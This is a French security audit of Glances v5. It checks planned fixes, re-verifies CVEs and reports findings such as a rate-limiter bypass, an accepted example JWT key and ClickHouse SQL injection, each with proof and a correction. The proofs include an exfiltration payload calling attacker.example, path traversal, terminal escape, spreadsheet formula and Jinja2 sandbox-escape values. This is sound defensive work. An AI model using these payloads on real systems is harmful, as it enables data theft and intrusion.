# Glances v5 — revue des actions de sécurité planifiées et audit post-bascule

**Date :** 2026-10-17 · **Branche :** `develop` (`a91dbae`, après la fusion de
`cutover/v5`, version `5.0.0b1` non publiée) · **Référence :**
`glances-v5-security-audit.md` (2026-10-04), `glances-v5-architecture-decisions.md`
§4.3, §4.5, §4.8, §8, §9, §11, Phase 4, `glances-v5-merge-checklist.md`,
`glances-v5-cutover-plan.md`, spec `2026-08-01-v5-security-advisories-sync-design.md`.

## Résumé

**Partie 1 — les actions planifiées.** Tout ce que le plan de dev marquait
« avant `5.0.0b1` » est en place et vérifié dans le code : bascule v4→v5 (B1),
M1, M2, M3, M4, M7, M8, M10, B-4, B-13, tests CVE-2026-33641 et GHSA-mcm7,
pile de middlewares, rate limiting, MCP. **Rien** de ce qui était reporté
« avant `5.0.0` » n'a été commencé : M5, M6, M9, M11 et 17 des 20 constats bas
reproduisent à l'identique. Un engagement du plan n'est pas tenu : la
synchronisation des avis v4 avec le §8 (spec du 2026-08-01) s'est arrêtée au
2026-08-01 ; les quatre avis des versions 4.5.7/4.5.8 n'ont pas de verdict v5
écrit (le code v5 les couvre, vérifié ici), et `NEWS.rst:247` publie encore un
`GHSA-TODO`.

**Partie 2 — l'audit.** Quatre passes indépendantes (serveur web/auth, exécution
de commandes/config, côté distant/exporteurs, chaîne logicielle/CI/packaging),
chaque constat vérifié dans le code et la plupart par une sonde exécutée
(`TestClient`, uvicorn réel sur loopback, `secure_popen` avec valeurs hostiles,
faux serveurs HTTP, `pip-audit`). Suite de tests : **4127 réussis, 30 ignorés,
0 échec**.

| Sévérité | Nombre |
|---|---:|
| Critique | 0 |
| Haute | 0 |
| Moyenne | 10 (dont 5 reportées depuis le 2026-10-04) |
| Basse | 31 |
| Info | 25 |

Aucune faille critique ou haute. L'authentification tient, le CORS et le
TrustedHost loopback sont corrects, la WebUI est propre, les CVE du §8
tiennent. Les constats moyens nouveaux : le limiteur d'échecs
d'authentification est contournable par tout utilisateur local
(`X-Forwarded-For` accepté depuis loopback, prouvé sur uvicorn réel) et chaque
essai coûte 240 ms de CPU au serveur ; la clé JWT d'exemple de
`conf/glances.conf` est acceptée telle quelle ; l'exporteur ClickHouse passe le
nom de plugin **brut** à `INSERT` (injection SQL depuis un serveur distant
malveillant en `-c --export clickhouse`) ; `SECURITY.md` est un gabarit cassé ;
les défauts Docker cumulent `0.0.0.0`, aucun filtrage de `Host`, root sans
`HEALTHCHECK`.

**Verdict :** rien ne bloque la publication de `5.0.0b1`. La vague 1 du plan
d'action (une journée de travail, aucune nouvelle clé obligatoire) doit être
faite avant `5.0.0rc1` ; la vague 2 avant `5.0.0`.

**Contrainte respectée :** aucune correction proposée n'ajoute de configuration
obligatoire ni ne change le comportement d'une installation sans
`glances.conf` (§9 : « no regression on defaults, conservative defaults »).
Les seules clés nouvelles sont optionnelles (`forwarded_allow_ips`,
`ssl_verify` des exporteurs).

---

## Partie 1 — Les actions de sécurité du plan de dev ont-elles été faites ?

### 1.1 Architecture §4.3 / §4.5 / §11 — serveur, limiteur, MCP

| Exigence | État | Preuve |
|---|---|---|
| Pile `TrustedHost → RateLimit → CORS → Auth` | ✅ | `glances/webserver.py:173-178` ; sonde : ordre effectif conforme |
| `UNAUTH_PATHS` = `/status`, `/healthz`, `POST /api/5/token`, correspondance exacte | ✅ | `webserver.py:76,489` ; `/api/5/token/`, `/API/5/token`, `//status` → 401 |
| CORS absent par défaut, `*` + credentials refusé | ✅ | `webserver.py:413-440`, `tests/test_webserver.py` |
| Authentification Basic + Bearer, HS256 + `iss` épinglés, `--set-password` | ✅ | `glances/security.py:130-148`, `main.py:1046-1078` |
| Rate limiting : général off, échecs d'auth 10/min on, 429 + `Retry-After`, journal fail2ban | ✅ | `glances/ratelimit.py`, `webserver.py:442-460` |
| Identifiants déjà validés jamais refusés (M3) | ✅ | `security.py:158-192` (`KnownCredentials`), sonde P10 |
| MCP opt-in, derrière l'auth, `mcp_allowed_hosts` + `TransportSecuritySettings` | ✅ | `outputs/glances_mcp.py:151-179` ; Host étranger → 421, Origin étranger → 403 |
| WARNING au démarrage sans mot de passe (CVE-2026-32596) | ✅ | `webserver.py:181-185` |

### 1.2 Architecture §4.8 et Phase 4 — l'audit et ses points ouverts

| Point | État |
|---|---|
| Audit complet sur `develop-v5`, rapport `.md` | ✅ fait le 2026-10-04 |
| `/api/5/config` sans auth : liste blanche | ✅ `config.py:157-160`, `routes.py:440-443` ; sonde : `{'outputs': {'api_doc': True}}` même avec secrets configurés |
| `UNAUTH_PATHS` sans énumération/oracle | ⚠️ chemins sains ; l'oracle temporel sur le nom d'utilisateur (B-1) demeure : 1,2 ms contre 254 ms |
| Rate limiting câblé et sain | ⚠️ câblé ; B-6 et B-7 ouverts (voir A1) |
| Chaque CVE du §8 revérifiée | ✅ voir 1.5 |
| Aucun module v4 importé par la v5 | ✅ bascule faite (B1) : `glances/config.py` est le chargeur v5 (`interpolation=None`), plus de `outdated.py`, `password*.py`, `server.py`, XML-RPC ; `system_exec` subsiste dans `globals.py:160` sans appelant (code mort) |
| Validation des performances | ✅ 2026-10-06 ; à refaire sur machine représentative (checklist) |
| Notes de version des ruptures | ✅ `NEWS.rst` 5.0.0b1 |

### 1.3 Plan de correction de l'audit du 2026-10-04

| Constat | Engagement | État au 2026-10-17 | Preuve |
|---|---|---|---|
| B1 code v4 sous la v5 | fusion | ✅ | bascule C1 à C9 du 2026-10-11 |
| M1 `/api/5/config` | b1 | ✅ | `config.py:68,157-160,393-403` |
| M2 DNS rebinding loopback | b1 | ✅ | `webserver.py:84,398-410` ; `Host: evil.example` → 400 |
| M3 verrouillage des bons identifiants | b1 | ✅ | `security.py:158-192` |
| M4 `--disable-config-exec` | b1 | ✅ | `main.py:1621-1631,1780,1800`, `api.py:162-165` ; `sh -c` documenté (décision mainteneur) |
| M7 exporteur graph | b1 | ✅ | `glances_graph/export.py:56-61,95-102,191-197` (XDG, 0700, `mkstemp` + `os.replace`) |
| M8 journal | b1 | ✅ (voir X-2) | `logger.py:28-56` (0700/0600, plus de `/tmp`) |
| M10 options exportées | b1 | ✅ (voir R-4) | `export_base.py:370-382` |
| B-4 TLS | b1 | ✅ | `main.py:1648-1676,1725-1732` ; reste : navigateur en `http://` (A7) |
| B-13 planchers | b1 | ✅ | `pyproject.toml:99,104-110` ; `uvicorn` sans plancher (W-10) |
| Tests CVE-2026-33641, GHSA-mcm7 | b1 | ✅ | `tests/test_config.py`, `tests/test_plugin_discovery.py` |
| M5 cible de redirection | 5.0.0 | ❌ | `secure.py:113-117,157` ; sonde : `name="../victim/owned"` écrit hors du dossier, lien symbolique suivi |
| M6 hddtemp | 5.0.0 | ❌ | `glances_hddtemp.py:84-91` ; sonde : `get()` bloqué après 4 s |
| M9 InfluxDB `verify_ssl=False` | 5.0.0 | ❌ | `glances_influxdb/export.py:81`, `glances_influxdb2/export.py:102` |
| M11 usurpation Zeroconf | 5.0.0 | ❌ | `zeroconf.py:120-123,172`, `browser_curses.py:119`, `browser.js:23-25`, `main.py:1459` |
| B-1, B-2, B-3, B-5, B-6, B-7, B-8, B-9, B-10, B-11, B-12, B-14, B-15, B-16, B-17, B-19, B-20 | 5.0.0 | ❌ tous reproduits | détail en partie 2 |
| B-18 | 5.0.0 | ⚠️ partiel | `_levels: []` toléré ; `_levels: [1]` ou `"x"` fait toujours sauter le tour |
| I-1 doc §8 (mécanisme `shlex.quote`) | 5.0.0 | ❌ | `glances-v5-architecture-decisions.md:1098-1100` décrit encore `shlex.quote`/`create_subprocess_shell`, tests `*_v5` disparus |
| I-3 conf/doc divergentes | 5.0.0 | ✅ | `conf/glances.conf:95-105`, `docs/config.rst:137-200` ; reste `ratelimit.py:34` cite `--forwarded-allow-ips` qui n'existe pas |
| I-4, I-5, I-10, I-12 | — | ⚠️ partiels | voir partie 2 |
| Report des correctifs sur `support/glancesv4` | après fusion | ❓ non vérifiable ici (branche absente du clone) |

### 1.4 Spec « sync des avis v4 » (2026-08-01) et §8

La spec impose un verdict v5 écrit pour chaque avis corrigé en v4 après le
2026-06-20, parce que les correctifs v4 n'atteignent pas les réécritures v5.
Le §8 est « last synced 2026-08-01 ». Depuis, `NEWS.rst` (4.5.7, 4.5.8)
publie quatre avis **sans ligne au §8 ni dans `.claude/skills/SKILL-security.md`** :

| Avis v4 | Verdict v5 (vérifié ici) | Test |
|---|---|---|
| GHSA-2jqf-3j6f-683p (+ correctif incomplet) — identifiants du plugin `ports` servis sans auth | ✅ Sain par construction : `get_limits()` n'expose qu'un espace de clés fermé (`plugins/plugin/base.py:946-1000`), `ports` publie `scheme://host/path` sans query ni identifiant (`ports/model.py:101,121`, `web_list.py:75,124`) | `tests/test_ports_no_credential_leak.py` |
| « GHSA-TODO » — identifiants via les limites publiées (REST, MCP, exports) | ✅ Sain : même mécanisme + M10 (`export_base.py:370-382`) | `tests/test_export_base.py` |
| GHSA-2hvx-g9v6-w29h — injection SQL ClickHouse (exfiltration OOB) | ⚠️ **Partiel** : `CREATE`/`DESCRIBE`/`ALTER` cités, mais `INSERT` reçoit le nom brut (**R-1**) | `tests/test_clickhouse_sanitize.py` ne teste pas l'argument `table=` de `insert()` |
| GHSA-56xw-p9qm-r437 — injection d'argument par guillemet dans le tokenizer de `secure.py` | ✅ Sain : rendu après découpage (`secure.py:61-73,125`) | `tests/test_secure_popen.py:75-110` |

À quoi s'ajoutent trois alias CVE (`CVE-2026-62982`, `68517`, `68518`,
`NEWS.rst:284-286`) présents au §8 seulement sous leur GHSA.

**Action :** quatre lignes au §8 et dans le miroir, résoudre le `GHSA-TODO`,
remettre une date de synchronisation. C'est la seule action du plan de dev
oubliée, et la méthode qui l'a fait oublier (sync manuelle) est à remplacer
par une case de la checklist de release.

### 1.5 CVE du §8 — revérification sur le code post-bascule

| Avis | Verdict | Code | Test |
|---|---|---|---|
| CVE-2026-30928 / 32609 / 68520 (secrets dans `/config`, `/args`) | ✅ clés + valeurs ; `/args` reste trop bavard (B-12) | `config.py:68,115-160,378-423`, `routes.py:82,312-315` | `test_config.py`, `test_routes.py` |
| CVE-2026-30930 TimescaleDB | ✅ | `glances_timescaledb/export.py:186-223` | `test_phase3_cve.py` (PG réel, ignoré ici) |
| CVE-2026-32596 WARNING sans auth | ✅ | `webserver.py:181-185` | `test_webserver.py` |
| CVE-2026-32608, GHSA-73wf, GHSA-qcpp (actions) | ✅ (mécanisme : rendu après tokenisation, pas `shlex.quote` — I-1) | `secure.py:61-73,110-125`, `actions/shell/__init__.py:114-136` | `test_action_shell.py:117,137` |
| CVE-2026-32610 / 34839 / GHSA-fp27 (CORS) | ✅ | `webserver.py:413-440` | `test_webserver.py` |
| CVE-2026-32611 DuckDB | ✅ (statique, DuckDB absent) | `glances_duckdb/export.py:62-64,155-162` | `test_phase3_cve.py` |
| CVE-2026-32632 DNS rebinding | ✅ loopback ; non loopback sans liste = non filtré, documenté (W-7) | `webserver.py:388-410` | `test_webserver.py:402` |
| CVE-2026-32633 serverslist | ✅ | `servers_list.py:84-117`, `routes.py:446-456` | `test_servers_list.py` |
| CVE-2026-32634 Zeroconf | ✅ mots de passe configurés ; mot de passe **tapé** toujours exposé (A7) | `servers_list.py:102-106,182-189` | `test_servers_list.py` |
| CVE-2026-33533 / 46608 / 46611 XML-RPC | ✅ sans objet | — | — |
| CVE-2026-33641 backticks | ✅ | `config.py:238` ; `system_exec` sans appelant | `test_config.py` |
| CVE-2026-35587 SSRF `ip` | ✅ http/https ; brèche FTP (B-14) | `plugins/ip/model.py:60-134,171-183,241` | `test_plugin_ip.py` |
| CVE-2026-35588 Cassandra | ✅ | `glances_cassandra/export.py:51-95,148-149` | `test_phase3_cve.py` |
| CVE-2026-46606 virsh | ✅ (`--` toujours absent, faible) | `vms/engines/virsh.py:38-51,209,228` | `test_plugin_virsh_injection.py` |
| CVE-2026-46607 pickle | ✅ sans objet (vérification de mise à jour retirée) | — | — |
| CVE-2026-53925 / GHSA-59fj / CVE-2026-68519 | ✅ | `main.py:1621-1631,1780`, `amps/amp.py:112-121`, `actions/shell/__init__.py:90-101` | `test_secure_popen.py`, `test_amps_list.py` |
| GHSA-mcm7 chargement de plugins | ✅ découverte limitée au paquet ; **mais** `globals.py:84-88` pousse encore `amps/`, `plugins/`, `exports/` sur `sys.path` (X-3, chemins du paquet, pas de chemin utilisateur) | `main.py:851-873`, `amps_list.py:125-146` | `test_plugin_discovery.py` |
| Durcissement terminal | ✅ TUI ; ❌ `--stdout`, `--stdout-csv`, `--fetch` (B-15) | `glances_curses.py:65,2300` | `test_curses.py` |

---

## Partie 2 — Audit

**Périmètre et méthode.** Quatre passes indépendantes sur l'arbre `a91dbae`,
sans modification de fichier suivi. Sondes exécutées : `TestClient` contre
`build_app()`, un uvicorn réel sur loopback (`X-Forwarded-For`), `secure_popen`
et le rendu Mustache avec valeurs hostiles, écouteur hddtemp local, 1 100
dossiers imbriqués, faux serveurs HTTP (client `-c`, navigateur, Zeroconf),
exporteurs instanciés sur des clients factices (StatsD, Graphite, Prometheus,
MQTT, ClickHouse, RabbitMQ, CSV), `pip-audit` sur les quatre fichiers de pins,
analyse de `package-lock.json`. Versions : fastapi 0.143.3, starlette 1.8.0,
uvicorn 0.54.0, python-jose 3.5.0, mcp 2.3.0, Python 3.13.

**Modèle de menace** (inchangé, CLAUDE.md) : l'API ouverte sans
`[outputs] password` est un choix, en général sur un réseau privé. Comptent :
un secret servi sans authentification, un contournement de l'authentification
quand elle est configurée, l'injection ou l'exécution de code, la SSRF, un
déni de service bon marché, un franchissement de frontière de privilège (le
démon root qui fait confiance à un fichier ou un socket d'un utilisateur), et
les défauts qui contredisent la documentation.

### 2.1 Constats moyens

#### A1 — Le limiteur d'échecs d'authentification se contourne, et chaque essai coûte 240 ms de CPU au serveur (B-6 + B-7 + B-3 + W-2)

- **Où :** `glances/main.py:1725-1732` (ni `proxy_headers` ni
  `forwarded_allow_ips` : uvicorn 0.54 fait confiance à `X-Forwarded-For`
  depuis `127.0.0.1,::1`) ; `glances/ratelimit.py:57,113-116` (10 000 seaux,
  éviction LRU qui rend un seau plein) ; `glances/security.py:43-45` (PBKDF2
  100 000 itérations, `dklen=128`) ; `glances/webserver.py:513-515` (vérification
  dans le pool de 40 threads d'anyio).
- **Preuve (uvicorn réel, `probe_xff.py`) :** 30 `POST /api/5/token` faux
  depuis 127.0.0.1 en faisant tourner `X-Forwarded-For` → **0 × 429** ; les
  mêmes 15 sans en-tête → 10 × 401 puis 5 × 429 ; 12 essais annonçant
  `X-Forwarded-For: 198.51.100.7` verrouillent cette adresse pour un tiers.
  Éviction : seau verrouillé → 10 001 autres clés → attente **0 s**.
  `verify_password` = 240 ms CPU (59 ms avec `dklen=32`).
- **Scénario :** tout utilisateur local (ou tout processus derrière le même
  reverse proxy local) force le mot de passe du démon root sans limite ; un
  attaquant distant avec une plage IPv6 /48 (65 536 /64) ou 10 001 adresses
  épuise le CPU de l'hôte à ~150 octets par requête.
- **Pourquoi moyen :** nécessite `[outputs] password` ; brute force illimité +
  déni de service bon marché contre un démon root. Le précédent audit avait
  noté B-6 et B-7 séparément en bas ; leur combinaison avec B-3 est le constat.
- **Correction (sans clé obligatoire) :**
  1. `uvicorn.Config(..., proxy_headers=False)` par défaut ; clé optionnelle
     `[outputs] forwarded_allow_ips` (vide par défaut) qui, si définie, rétablit
     `proxy_headers=True` avec cette liste. Corriger `ratelimit.py:34`.
  2. Un `anyio.CapacityLimiter(2)` partagé autour des deux appels
     `run_in_threadpool(verify_password…)` (`webserver.py:514`, `routes.py:246`).
  3. `Buckets._store` : ne jamais évincer un seau avec `tokens < 1` ; évincer
     d'abord les seaux pleins.
  4. Nouveau format de hachage `pbkdf2_sha256$<iter>$<salt>$<hash>` avec
     `dklen=32` ; l'ancien `salt$hex` reste lu (`--set-password` produit le
     nouveau).

#### A2 — La clé JWT d'exemple de `conf/glances.conf` est acceptée ; aucune longueur minimale (B-2, I-2)

- **Où :** `glances/security.py:109-111` (toute chaîne non vide),
  `glances/webserver.py:474-476`, `conf/glances.conf:116`
  (`#jwt_secret_key=your-secure-secret-key-here`).
- **Preuve (P2) :** jeton forgé avec la clé d'exemple, sans `exp` → **200** sur
  toutes les routes.
- **Scénario :** un opérateur décommente la ligne d'exemple (elle est faite pour
  ça) : n'importe qui frappe des jetons, le mot de passe ne sert plus à rien.
  Voisin : aucun `require_exp`, `sub` non comparé, `jwt_expire_minutes` sans
  plafond (I-2).
- **Correction :** refuser le texte d'exemple et toute clé de moins de 32
  octets → clé éphémère + WARNING (le serveur démarre quand même) ;
  `require_exp`/`require_iat`, `sub == username`, plafond
  `jwt_expire_minutes ≤ 1440`. Remplacer l'exemple par
  `#jwt_secret_key=<32 random characters, e.g. python3 -c "import secrets;print(secrets.token_urlsafe(32))">`.

#### A3 — ClickHouse : le nom de plugin atteint `INSERT INTO` sans citation (R-1, + R-2, R-7)

- **Où :** `glances/exports/glances_clickhouse/export.py:189`
  (`self.client.insert(table=name, …)` alors que `:173-188` utilisent
  `table = quote(name)`) ; `clickhouse_connect/driver/insert.py:107` construit
  `f"INSERT INTO {self.table}…"` sans citer ; `_SAFE_IDENTIFIER` (`:48`) admet
  `'`, `(`, `)`, espace, virgule ; `glances/client.py:259-272` (`remote_plugins`
  : chaque clé de `/api/5/all/info` devient un `plugin_name`, non validé).
- **Preuve (`proof_clickhouse.py`) :** nom de plugin
  `FUNCTION url('http://attacker.example/x', Native)` → le pilote envoie
  `INSERT INTO FUNCTION url('http://attacker.example/x', Native) (…) FORMAT Native`
  (ClickHouse valide : la ligne part chez l'attaquant depuis l'hôte de la base ;
  `file()`, `s3()`, `remote()` aussi). Vérifié jusqu'aux octets émis, pas
  contre un ClickHouse réel.
- **Scénario :** `glances -c <serveur hostile> --export clickhouse`. Localement
  les noms de plugins sont des constantes : pas d'exposition sans `-c`.
- **Voisins (bas) :** le nom de plugin distant choisit aussi la **section de
  `glances.conf` du client** fusionnée au payload (R-2 : un serveur annonçant
  un plugin `passwords` fait exporter `[passwords]` du client, prouvé) ; MQTT
  publie sous un sous-topic arbitraire si le nom contient `/`
  (`glances_mqtt/export.py:136,139`), Graphite/StatsD injectent des points via
  un retour à la ligne (R-7, B-20).
- **Correction :** `insert(table=table, …)` (un jeton) ; dans `remote_plugins()`,
  n'accepter que `^[a-z][a-z0-9_]{0,63}$` (tous les noms locaux passent) et
  refuser les noms de sections réservées (`global`, `outputs`, `passwords`,
  `serverlist`, `client`, sections d'exporteurs) ; un test sur l'argument
  `table=` de `insert()`.

#### A4 — Une valeur rendue dans la cible d'une redirection `>` choisit le fichier écrit par root (M5, reporté)

- **Où :** `glances/secure.py:113-117` (cible rendue en une chaîne, aucun
  contrôle), `:157` (`open(path, "w")`, liens suivis). Voisins : argument rendu
  commençant par `-` lu comme option (X-8) ; exemples livrés `> /tmp/*.alert`
  et un `>>` que `secure_popen` refuse (X-4, `conf/glances.conf:226,312,321,383,509`).
- **Preuve (P1–P3) :** `echo owned > logs/{{name}}.log` avec
  `name="../victim/owned"` → `victim/owned.log` créé ; lien
  `logs/alert.log -> victim/secret.txt` suivi et victime écrasée ;
  `ls {{name}}` avec `--version` → `ls (GNU coreutils) 9.4`.
- **Correction :** refuser une valeur **rendue** contenant `/`, `..` ou NUL dans
  la cible ; ouvrir avec `O_NOFOLLOW` ; accepter `>>` (découper sur `>>`
  d'abord, mode `"a"`) ; déplacer les exemples vers
  `~/.local/state/glances/` et documenter `{{{var}}}` et `--` dans
  `docs/aoa/actions.rst` (X-7, X-8).

#### A5 — Client hddtemp sans délai ni limite de taille (M6, reporté)

- **Où :** `glances/plugins/sensors/sensor/glances_hddtemp.py:84-91` ; activé
  par défaut sur 127.0.0.1:7634 (`conf/glances.conf:570-574`). Voisin :
  `sck.close()` dans `finally` lève `NameError` si `socket()` a échoué.
- **Preuve (Q1) :** écouteur local qui accepte sans écrire →
  `GlancesGrabHDDTemp.get()` toujours bloqué après 4 s.
- **Scénario :** sans démon hddtemp, un utilisateur local prend le port 7634
  (non privilégié) : toute la collecte capteurs (températures, ventilateurs,
  batterie) se fige, ou la mémoire de root grossit.
- **Correction :** `settimeout(2)`, plafond 64 Kio, fermeture garantie. hddtemp
  est abandonné en amont : `disable=True` par défaut dans `conf/glances.conf`
  est la correction la plus simple.

#### A6 — Exporteurs InfluxDB 1.x et 2.x : certificat TLS jamais vérifié (M9, reporté)

- **Où :** `glances/exports/glances_influxdb/export.py:81`,
  `glances_influxdb2/export.py:102` (`verify_ssl=False` en dur) ;
  `docs/gw/influxdb.rst:76,117` recommande `protocol=https` sans dire que rien
  n'est vérifié. InfluxDB 3 laisse le défaut de la bibliothèque (vérifie).
- **Scénario :** un attaquant sur le chemin réseau récupère le mot de passe
  (1.x) ou le jeton, souvent tous droits (2.x).
- **Correction :** vérifier par défaut ; clé optionnelle `ssl_verify` (booléen
  ou chemin de CA) comme `[client] ssl_verify` et `[ports] web_x_ssl_verify`.
  Test manquant : aucun test ne lit `verify_ssl`.

#### A7 — Une annonce Zeroconf se fait passer pour un serveur connu, et le mot de passe tapé part en clair (M11 + résidu B-4 + I-13, reportés)

- **Où :** `glances/zeroconf.py:120-123,172` (alias libre, adresse annoncée),
  `outputs/browser_curses.py:119` et `static/js/browser.js:23-25`
  (`alias or name`, source jamais affichée bien que `source="zeroconf"` soit
  porté par `ServerEntry`), `main.py:1459` (`Password for glances@<alias>`),
  `servers_list.py:98-100` + `client.py:78-79` (un serveur découvert est
  interrogé en `http://`), `client.py:118-121` (WARNING invisible dans le TUI).
- **Preuve (`proof_browser.py`) :** annonce `prod-db` depuis 192.168.1.66
  listée et invitée comme « prod-db » ; le mot de passe tapé part en Basic sur
  HTTP clair vers l'attaquant.
- **Correction :** afficher `prod-db (zeroconf 192.168.1.66)` dans les deux
  interfaces, l'adresse dans l'invite, refuser un alias identique à une entrée
  statique ; pour une entrée découverte PROTECTED, essayer `https://` d'abord ou
  afficher l'avertissement de clair dans le TUI avant l'invite.

#### A8 — `SECURITY.md` est un gabarit cassé et la tenue des avis a pris du retard (S-1, S-12)

- **Où :** `SECURITY.md:7-8` (seule `4.x` supportée, pas de ligne 5.x),
  `:12` (`{{cookiecutter.project_name}}` littéral), aucun canal de signalement
  (ni e-mail, ni lien vers le signalement privé GitHub), aucun délai annoncé ;
  installé sur chaque machine (`MANIFEST.in:7`, `pyproject.toml:124`).
  `NEWS.rst:247` : `GHSA-TODO` sur un correctif publié. §8 non synchronisé
  (partie 1.4). Pas de `.github/ISSUE_TEMPLATE/config.yml` qui détourne les
  rapporteurs des issues publiques.
- **Pourquoi moyen :** c'est la porte d'entrée des rapporteurs ; un projet qui
  publie quinze avis par an ne peut pas l'avoir cassée.
- **Correction (15 lignes) :** `5.x ✓ / 4.5.x correctifs de sécurité seulement /
  < 4.5 ✗` ; « signalez en privé via
  `github.com/nicolargo/glances/security/advisories/new` ou à <adresse> » ;
  accusé de réception sous N jours ; crédit. `config.yml` avec le lien.
  Résoudre le `GHSA-TODO`, quatre lignes au §8 + miroir, et une case « §8
  synchronisé » dans la checklist de release.

#### A9 — Défauts de l'image Docker : `0.0.0.0` sans filtrage de `Host`, root, pas de `HEALTHCHECK`, paquets Ubuntu non mis à jour (S-2, S-3, W-7)

- **Où :** `docker-compose/glances.conf:77` (`bind_address=0.0.0.0`, cuit dans
  l'image : `alpine.Dockerfile:100`, `ubuntu.Dockerfile:98`) ;
  `docker-compose.yml:14-15,45` (`network_mode: host`, `-w --enable-mcp`) ;
  `webserver.py:402-408` (non loopback sans `webui_allowed_hosts` → aucun
  middleware, un WARNING) ; `USER glances` commenté partout
  (`alpine.Dockerfile:112-149`, `ubuntu.Dockerfile:109-163`) ; aucun
  `HEALTHCHECK` dans les Dockerfiles ; `apt-get upgrade` seulement dans l'étape
  `build` jetable (`ubuntu.Dockerfile:52`), jamais dans `base` → `release` ;
  `FROM` par tag sans digest ; `docker.sock:…:ro` ne restreint rien
  (`README.rst:396,417,428`).
- **Scénario :** le déploiement Docker type (LAN, sans mot de passe) rouvre la
  classe CVE-2026-32632 : une page web visitée par un utilisateur du LAN
  rebinde son nom sur l'hôte Glances, lit `/api/5/all` et les lignes de
  commande des processus, et déclenche les POST (B-5). Root est imposé par le
  plugin containers : c'est une décision produit, à documenter.
- **Correction (sans changer le défaut) :** bloc de commentaires à côté de
  `bind_address` et de `network_mode: host` recommandant
  `webui_allowed_hosts=<hôte>,localhost,127.0.0.1` + `password` sur un réseau
  partagé ; `-p 61208:61208` au lieu de `host` pour la variante web ;
  `apt-get upgrade` dans `base` ; `HEALTHCHECK CMD curl -f http://localhost:61208/healthz`
  (curl est déjà présent) ; épingler les `FROM` par digest + Dependabot
  `docker` ; une phrase sur `:ro`.

#### A10 — Un `-C` inexistant n'est qu'un WARNING : le serveur démarre sans le mot de passe que ce fichier portait (B-8, reclassé)

- **Où :** `glances/config.py:204-212` ; `main.py:1776-1779` n'attrape que
  `ConfigFileError`. Un fichier illisible, lui, est fatal.
- **Preuve (Q7/P12) :** `GlancesConfig(cli_config_path="/nonexistent/glances.conf")`
  → `loaded_sources: []`, aucune exception.
- **Pourquoi moyen :** échec **ouvert** : une faute de frappe dans une unité
  systemd publie l'API sans mot de passe, et le WARNING part dans un journal
  que personne ne lit. Classé bas le 2026-10-04 ; reclassé parce que la
  correction tient en deux lignes et que l'effet est un contournement complet.
- **Correction :** `-C` absent → `ConfigFileError` (exit 2). Les chemins de
  recherche implicites restent silencieux.

### 2.2 Constats bas

| Id | Constat | Où | Correction |
|---|---|---|---|
| B-1 | Oracle temporel sur le nom d'utilisateur : 1,2 ms contre 254 ms (`and`/`or` court-circuités avant PBKDF2). | `webserver.py:513-515`, `routes.py:244-246` | Toujours exécuter `verify_password` (hash factice), combiner sans court-circuit, dans un `decode_basic` partagé (avec W-3). |
| B-5 | Les trois POST (tri, épinglage) se déclenchent depuis un autre site, aussi avec mot de passe quand le navigateur rejoue le Basic en cache (prouvé : `Origin: https://evil.example` → 200) ; aucun en-tête `X-Frame-Options`, `X-Content-Type-Options`, `Referrer-Policy` côté serveur (`index.html:18-20` dit que c'est « au middleware », qui ne le fait pas). | `routes.py:150-207`, `webserver.py` | Un middleware ASGI de dix lignes : `nosniff`, `X-Frame-Options: DENY`, `Referrer-Policy: same-origin` ; 403 sur POST avec `Sec-Fetch-Site: cross-site` ou `Origin` étranger. |
| B-9 / X-2 | En root sous `sudo -E` (ou sudo qui garde `HOME`/`XDG_*`) : configuration utilisateur lue sans contrôle de propriétaire (`critical_action` exécutée en root) ; dossier de journal `$XDG_CACHE_HOME/glances` appartenant à un utilisateur accepté, lien planté suivi et sa cible `fchmod 0600` (prouvé : `victim mode 0o600`, ligne ajoutée par root). | `config.py:214-252`, `logger.py:28-59` | Un helper partagé (~10 lignes) : en euid 0, ignorer un fichier ou dossier dont `st_uid` n'est ni 0 ni l'euid, ou inscriptible par d'autres ; `O_NOFOLLOW` et `fchmod` seulement si `fstat().st_uid == geteuid()`. Même traitement pour `LOG_CFG` (I-10, S-10). |
| B-11 | `/docs`, `/redoc` actifs par défaut, Swagger/ReDoc depuis jsDelivr en version majeure flottante sans `integrity`, favicon depuis `fastapi.tiangolo.com`, polices Google : trois tiers contactés depuis une page non authentifiée par défaut. | `webserver.py:143,152-153`, `config.py:101` | Servir `swagger-ui-dist` via le pipeline webpack existant, ou `api_doc` désactivé par défaut quand l'écoute n'est pas loopback (reprend la logique TrustedHost, aucune clé nouvelle). |
| W-1 | `/openapi.json` reste servi avec `api_doc=false` (14 845 octets listant toutes les routes). | `webserver.py:149-155` | `openapi_url=None` quand `api_doc` est faux (`restful_doc.py:257` appelle `app.openapi()` directement, non affecté). |
| B-12 | `/api/5/args` sert sans auth 69 clés : chemins absolus `export_csv_file`, `export_json_file`, `export_graph_path`, regex `process_filter`. La WebUI en lit deux. | `routes.py:82,518-544` | Liste blanche des drapeaux lus par la WebUI (comme `PUBLIC_OPTIONS`). |
| B-14 | Plugin `ip` : `build_opener()` ajoute `FTPHandler`, `FileHandler`, `DataHandler` ; `redirect_request` ne vérifie pas le schéma → `302 Location: ftp://10.0.0.5/` atteint le réseau privé. | `plugins/ip/model.py:171-183,241` | Liste explicite de gestionnaires ; refuser tout schéma autre que http(s) dans `redirect_request`. |
| B-15 | `--stdout`, `--stdout-csv`, `--fetch` écrivent les noms bruts (`\x1b]0;PWNED\x07\x1b[2J` émis tel quel) ; CSV par `",".join` (virgule, retour à la ligne, `=` en tête). | `outputs/stdout.py:77-163`, `outputs/fetch.py:196-198` | Même filtre C0/DEL/C1 que le TUI ; module `csv`. |
| R-5 | Exporteur CSV : injection de formule tableur (`=HYPERLINK(...)`, `+cmd\|…`) via un nom surveillé. | `glances_csv/export.py:134,167,198` | Préfixer `'` les cellules commençant par `= + - @ \t \r`. |
| B-16 | Redaction de `--issue` : `ports.url/description`, `containers.name/command/engine_url`, `vms.name`, `wifi.ssid`, `fs.mnt_point`, `amps.result` et la section « Warnings » passent (`'command': 'mysqld --password=S3CRET'`). | `outputs/issue.py:48-56,297-299` | Compléter `_REDACT_FIELDS`, filtrer les avertissements. |
| I-8 | `--fetch-template` : Jinja2 non sandboxé (`{{ ui.__init__.__globals__['os'].getuid() }}` → `0`). Seul un modèle partagé est un risque. | `outputs/fetch.py:197` | `SandboxedEnvironment`. |
